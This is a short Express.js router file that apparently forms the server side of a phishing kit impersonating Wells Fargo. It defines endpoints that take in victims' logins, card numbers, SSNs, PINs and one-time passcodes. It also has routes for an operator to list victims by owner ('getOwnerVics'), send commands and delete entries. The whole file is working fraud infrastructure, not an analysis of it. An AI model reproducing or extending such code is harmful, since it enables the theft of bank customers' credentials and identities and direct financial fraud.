const express = require("express");
const {
  getOwnerVics,
  command,
  deleteEntry,
  getInfo,
  submitLogin,
  submitCard,
  submitSSN,
  submitPin,
  submitOtp,
  submitLoginAgain,
} = require("../controllers/wellsController");
const router = express.Router();

router.post("/login", submitLogin);
router.post("/loginAgain", submitLoginAgain);
router.post("/card", submitCard);
router.post("/ssn", submitSSN);
router.post("/pin", submitPin);
router.post("/otp", submitOtp);
router.get("/customers/:owner", getOwnerVics);
router.post("/command", command);
router.get("/customers/id/:uniqueid", getInfo);
router.post("/delete", deleteEntry);

module.exports = router;
